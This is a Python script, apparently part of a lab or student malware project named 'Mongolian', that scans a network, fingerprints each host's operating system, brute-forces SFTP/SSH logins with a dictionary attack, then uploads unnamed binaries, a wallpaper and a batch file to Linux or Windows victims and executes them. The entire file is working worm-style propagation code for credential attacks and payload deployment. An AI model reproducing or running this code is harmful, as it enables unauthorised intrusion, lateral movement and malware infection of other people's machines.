#!/usr/bin/env python3

from get_ip import getIP
from get_os import getos
from colorama import init, Fore, Back, Style
from termcolor import colored
import pysftp as sftp
import dict_attack
import threading

def doLinux(handle, user, password, ip):
    handle.makedirs('/tmp/m0ng0li4n')
    handle.put('/home/kali/Desktop/Mongolian/bin/le','/tmp/m0ng0li4n/le')
    handle.put('/home/kali/Desktop/Mongolian/bin/ld','/tmp/m0ng0li4n/ld')
    handle.execute('chmod +x /tmp/m0ng0li4n/le')
    handle.execute('chmod +x /tmp/m0ng0li4n/ld')
    handle.execute('/tmp/m0ng0li4n/le')
    print(colored(Fore.GREEN + ip + ' has been dealt with'))

def doWindows(handle, user, password, ip):
    handle.makedirs('C:\\Users\\'+user+'\\m0ng0li4n')
    handle.put('/home/kali/Desktop/Mongolian/bin/windowsFlow.exe','C:\\Users\\'+user+'\\m0ng0li4n\\windowsFlow.exe')
    handle.put('/home/kali/Desktop/Mongolian/bin/windowsSaver.exe','C:\\Users\\'+user+'\\m0ng0li4n\\windowsSaver.exe')
    handle.put('/home/kali/Desktop/Mongolian/wallpaper.bmp', 'C:\\Users\\'+user+'\\m0ng0li4n\\wallpaper.bmp')
    handle.put('/home/kali/Desktop/Mongolian/windowsWallaper.bat','C:\\Users'+user+'\\m0ng0li4n\\windowsWallaper.bat')
    handle.execute('C:\\Users\\'+user+'\\m0ng0li4n\\windowsFlow.exe')
    print(colored(Fore.GREEN + ip + ' has been dealt with'))

ips = getIP()
ips.remove('10.0.2.9')
for ip in ips:
    try:
        os = getos(ip)
        print(colored(Fore.GREEN + ip + ' --> '+ os))
        if os == 'Linux':
            try:
                print(colored(Fore.YELLOW + 'Trying Brute Force'))
                handle, user, password = dict_attack.attack(ip)
                t = threading.Thread(target=doLinux, args=(handle, user, password, ip))
                t.daemon = False
                t.start()
            except:
                print(colored(Fore.YELLOW + '[-] Skipping ' + ip))
        elif os == 'AVtech' or os == 'Microsoft':
            try:
                print(colored(Fore.YELLOW + 'Trying Brute Force'))
                handle,user,password = dict_attack.attack(ip)
                t = threading.Thread(target=doWindows, args = (handle, user, password, ip))
                t.daemon = False
                t.start()
            except Exception as e:
                print(e)
                print(colored(Fore.YELLOW + '[-] Skipping ' + ip))
            pass

    except:
        print(colored(Fore.RED + 'Failed for ' + ip))
